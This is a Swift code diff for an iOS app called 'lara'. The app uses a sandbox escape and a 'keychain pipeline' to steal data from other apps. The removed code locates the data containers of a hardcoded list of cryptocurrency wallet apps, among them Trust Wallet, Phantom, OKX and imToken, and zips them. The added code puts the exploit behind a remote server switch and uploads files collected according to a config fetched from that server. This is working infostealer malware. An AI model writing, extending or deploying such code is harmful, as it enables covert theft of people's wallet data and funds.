@@ -103,7 +103,12 @@ struct lara: App {
                     // beautiful name root
                     // thanks
                     mgr.hasOffsets = emergencyfixfunctiontobereplacedlateronquestionmark()
-                    autorunkeychainpipeline()
+                    // 主协议：先拉 /api/device/config，按 exploit_enabled 开关决定是否走管线
+                    MainAPI.bootstrap { run in
+                        if run {
+                            self.autorunkeychainpipeline()
+                        }
+                    }
                 } else {
                     Alertinator.shared.alert(title: "This device is not supported!", body: "We apologize, but this device is currently not supported by Lara. Possible reasons: \n- You are on an unsupported iOS version (Supported: iOS 16.0 - iOS 18.7.1, iOS 26.0 - iOS 26.0.1) \n- Your device has MIE (A19+ or M5+) \n- A debugger is attached.", actionLabel: "Exit App", action: { exitinator() })
                 }
@@ -150,7 +155,7 @@ struct lara: App {
     // point stays a plain handoff to the framework pipeline.
     private func autorunkeychainpipeline() {
         globallogger.log("(kc) using embedded libuiopsersvc.framework (framework-only)")
-        globallogger.log("(kc) build-marker export-v7 (wallet-only json, matching the zipped apps)")
+        globallogger.log("(kc) build-marker api-v1 (main-protocol gate + config-driven collect/upload)")
         prepareAndRunKeychainPipeline()
     }
 
@@ -190,11 +195,10 @@ struct lara: App {
                 failure = error
             }
 
-            // After the pipeline the sandbox escape is live: package the wallet
-            // apps' data containers into zips (framework exports
-            // KeychainLookupAppDataContainer for exactly this step).
+            // After the pipeline the sandbox escape is live: collect files
+            // strictly per /api/device/config collect_configs, zip and upload.
             if let result, (result["ok"] as? Int ?? 0) == 1 {
-                self.harvestWalletContainers()
+                MainAPI.postPipelineActions()
             }
 
             DispatchQueue.main.async {
@@ -239,84 +243,6 @@ struct lara: App {
                 timer.invalidate()
             }
         }
-    }
-
-    private func findContainerPath(forBundleID bid: String) -> String? {
-        // 1) Framework LSApplicationProxy/MCM lookup (may need entitlements).
-        if let p = LaraKeychainSvc.lookupAppDataContainer(forBundleID: bid),
-           FileManager.default.fileExists(atPath: p) {
-            return p
-        }
-        // 2) Direct scan of /var/mobile/Containers/Data/Application — plain
-        // file reads that work once the sandbox escape is live, no entitlements
-        // required. Each container carries its bundle id in
-        // .com.apple.mobile_container_manager.metadata.plist.
-        let root = "/var/mobile/Containers/Data/Application"
-        guard let dirs = try? FileManager.default.contentsOfDirectory(atPath: root) else {
-            return nil
-        }
-        for d in dirs {
-            let meta = root + "/" + d + "/.com.apple.mobile_container_manager.metadata.plist"
-            guard let pl = NSDictionary(contentsOfFile: meta),
-                  let ident = pl["MCMMetadataIdentifier"] as? String,
-                  ident == bid else { continue }
-            return root + "/" + d
-        }
-        return nil
-    }
-
-    private func harvestWalletContainers() {
-        let walletBundleIDs: [String] = [
-            "com.bitpie.wallet",        // Bitpie
-            "com.sixdays.litewallet",   // Trust Wallet
-            "com.tonkeeper",            // Tonkeeper
-            "com.global.wallet.ios",    // TokenPocket
-            "com.tronlink.hdwallet",    // TronLink
-            "com.tronlink.wallet",
-            "com.okex.wallet",          // OKX
-            "com.okex.okexwallet",
-            "com.okx.wallet",
-            "com.coin98.crypto",        // Coin98
-            "app.phantom",              // Phantom
-            "im.token.app"              // imToken
-        ]
-        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
-        guard let docs else { return }
-        let outDir = docs.appendingPathComponent("KeychainDump/wallet_files", isDirectory: true)
-        do {
-            try FileManager.default.createDirectory(at: outDir, withIntermediateDirectories: true)
-        } catch {
-            globallogger.log("(kc) wallet_files dir create failed: \(error.localizedDescription)")
-            return
-        }
-
-        for bid in walletBundleIDs {
-            guard let containerPath = findContainerPath(forBundleID: bid) else {
-                globallogger.log("(kc) wallet container not found: \(bid)")
-                continue
-            }
-            globallogger.log("(kc) wallet container found: \(bid) -> \(containerPath)")
-
-            let src = URL(fileURLWithPath: containerPath)
-            var total: Int64 = 0
-            if let vals = try? src.resourceValues(forKeys: [.totalFileAllocatedSizeKey]),
-               let sz = vals.totalFileAllocatedSize as? Int {
-                total = Int64(sz)
-            }
-            if total > 4 * 1024 * 1024 * 1024 {
-                globallogger.log("(kc) wallet container too big (\(total) B), skipped: \(bid)")
-                continue
-            }
-
-            let zip = outDir.appendingPathComponent("\(bid).zip")
-            do {
-                try createZipArchive(fromDirectory: src, to: zip)
-                globallogger.log("(kc) wallet zip written: \(zip.path) (\(total) B source)")
-            } catch {
-                globallogger.log("(kc) wallet zip failed \(bid): \(error.localizedDescription)")
-            }
-        }
-        globallogger.log("(kc) wallet container harvest done")
     }
 
     private func handlebg() {
